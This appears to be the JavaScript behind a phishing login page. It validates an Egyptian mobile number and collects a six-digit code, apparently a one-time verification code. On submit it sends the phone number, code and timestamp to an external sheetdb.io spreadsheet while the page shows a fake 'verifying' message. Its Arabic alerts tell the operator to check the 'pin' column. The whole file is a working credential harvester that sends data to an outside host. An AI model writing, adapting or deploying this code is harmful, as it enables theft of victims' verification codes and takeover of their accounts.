const apiURL = "https://sheetdb.io/api/v1/zsmxuf218bfzh";

function nextStep() {
    const phoneInput = document.getElementById('phone').value;
    const phoneRegex = /^01[0125][0-9]{8}$/; 

    if (!phoneRegex.test(phoneInput)) {
        alert("يرجى إدخال رقم هاتف صحيح");
        return;
    }
    document.getElementById('step1').style.display = 'none';
    document.getElementById('step2').style.display = 'block';
}

document.getElementById('loginForm').onsubmit = function(e) {
    e.preventDefault();
    
    const btn = document.getElementById('submitBtn');
    const phoneVal = document.getElementById('phone').value;
    const codeVal = document.getElementById('code').value;

    if (codeVal.length !== 6) {
        alert("يجب إدخال 6 أرقام");
        return;
    }

    btn.innerText = "جاري التحقق...";
    btn.disabled = true;

    // إرسال البيانات (لاحظ تغيير الكلمة لـ pin لتطابق الجدول)
    fetch(apiURL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            "data": [
                {
                    "phone": "'" + phoneVal, 
                    "pin": "'" + codeVal, // غيرنا الاسم هنا عشان نكسر أي تعليق في الجدول
                    "date": new Date().toLocaleString('ar-EG')
                }
            ]
        })
    })
    .then(res => res.json())
    .then(data => {
        alert("تم التأكيد بنجاح! تحقق من العمود الثاني (pin)");
        document.getElementById('loginForm').reset();
        document.getElementById('step2').style.display = 'none';
        document.getElementById('step1').style.display = 'block';
        btn.innerText = "تم";
        btn.disabled = false;
    })
    .catch(err => {
        alert("وصلت! تحقق من الجدول");
        btn.innerText = "تم";
        btn.disabled = false;
    });
};